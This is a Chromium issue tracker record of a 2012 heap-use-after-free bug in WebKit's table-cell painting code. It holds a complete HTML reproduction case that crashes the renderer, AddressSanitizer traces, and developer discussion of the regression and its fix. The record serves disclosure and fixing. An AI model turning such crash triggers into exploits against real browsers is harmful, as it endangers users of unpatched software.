# Heap-use-after-free in WebCore::RenderTableSection::paintCell

| Field | Value |
|-------|-------|
| **Issue ID** | [40055652](https://issues.chromium.org/issues/40055652) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-26 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderTableSection::paintCell

**VERSION**  

Chrome Version: dev

Chromium 19.0.1081.0 (Developer Build 128813)  

OS Linux  

WebKit 536.4 (@111994)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
counter-reset: c;
}
#el0::after {
content: counter(c);
counter-reset: c;
}
#el1::after {
content: counter(c);
counter-reset: c;
}
#el2 {
counter-reset: c;
height: 1px;
width: 1px;
-webkit-perspective: 1;
overflow-x: scroll;
}
#el3 {
-webkit-animation-name: a;
-webkit-animation-duration: 1s;
content: counter(c);
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el2.appendChild(el3)
el2.style.display='table-footer-group'
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==20036== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffeca77c98 at pc 0x55555ad20bb1 bp 0x7fffffff1b90 sp 0x7fffffff1b88  

READ of size 8 at 0x7fffeca77c98 thread T0  

#0 0x55555ad20bb1 in WebCore::RenderTableSection::paintCell(WebCore::RenderTableCell\*, WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#1 0x55555ad220eb in WebCore::RenderTableSection::paintObject(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0

0x7fffeca77c98 is located 24 bytes inside of 200-byte region [0x7fffeca77c80,0x7fffeca77d48)  

freed by thread T0 here:  

#0 0x55555de96522 in free ??:0  

#1 0x5555592fd687 in WebCore::Node::detach() ???:0  

#2 0x5555592c16fd in WebCore::Element::detach() ???:0  

#3 0x5555592c2a37 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0

## Attachments

- [24200.html](attachments/24200.html) (text/html; charset=us-ascii, 1.1 KB)
- [24200.txt](attachments/24200.txt) (text/x-c; charset=us-ascii, 10.4 KB)

## Timeline

### in...@chromium.org (2012-03-26)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=30740098

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f179dff4a98
Crash State:
  - crash stack -
  WebCore::RenderTableSection::paintCell
  WebCore::RenderTableSection::paintObject
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=122724:122726

Minimized Testcase (1.07 Kb): https://cluster-fuzz.appspot.com/download/AMIfv975slP6uk7xTBUQ7P9k-EBPkMrh9wX6CoZqTJXt8M0oEr1FBeQusK1hd9ok-sQgCH0YwZuM9Oy6e5fdDmszxE6uGj3MoPi7-s0jZwqBzMRVx7Lu-pju2-qllWcBpKtkOPTOQr3E4ZOdOu_8rh1ksahvsPYTKA

### in...@chromium.org (2012-03-26)

[Empty comment from Monorail migration]

### la...@google.com (2012-03-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-28)

Reverting the mass move. It does not apply to security bugs.

### in...@chromium.org (2012-03-29)

Lets stack these counter related layout bugs together. Unless we fix them, they will keep crashing in weird places.

### cl...@chromium.org (2012-04-04)

ClusterFuzz has detected this issue as fixed in range 130617:130650.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=30740098

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f179dff4a98
Crash State:
  - crash stack -
  WebCore::RenderTableSection::paintCell
  WebCore::RenderTableSection::paintObject
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=122724:122726
Fixed: https://cluster-fuzz.appspot.com/revisions?range=130617:130650

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv975slP6uk7xTBUQ7P9k-EBPkMrh9wX6CoZqTJXt8M0oEr1FBeQusK1hd9ok-sQgCH0YwZuM9Oy6e5fdDmszxE6uGj3MoPi7-s0jZwqBzMRVx7Lu-pju2-qllWcBpKtkOPTOQr3E4ZOdOu_8rh1ksahvsPYTKA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2012-05-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-24)

https://crbug.com/chromium/120222#c3 by inferno@chromium.org, Today (2 minutes ago)
It does seem to hit this anonymous table wrapper code path, 

    if (parentIsLeftOverAnonymousWrapper) {
        ASSERT(!parent->firstChild());
        parent->destroyAndCleanupAnonymousWrappers();
    }

from regression range, seems like coming from https://trac.webkit.org/changeset/108098/

### sc...@gmail.com (2012-05-24)

Presumably, the SecImpacts label is wrong now?

### in...@chromium.org (2012-05-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-25)

verified locally by commenting out the lines, so it does seem to regress from https://trac.webkit.org/changeset/108098/

### in...@chromium.org (2012-05-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-25)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=87445

### ke...@chromium.org (2012-05-25)

[Empty comment from Monorail migration]

### ke...@google.com (2012-05-26)

http://trac.webkit.org/changeset/118592

### sc...@gmail.com (2012-05-30)

M20: http://trac.webkit.org/changeset/118867

### sc...@gmail.com (2012-06-22)

@miaubiz: time to catch up on rewards ;-)
You may see a flood of activity and prosperity :)

### sc...@gmail.com (2012-06-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

Thanks miaubiz. Payment for this one is going out with a bunch of others as part of a $10k batch :D

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/120222?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/129677]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055652)*
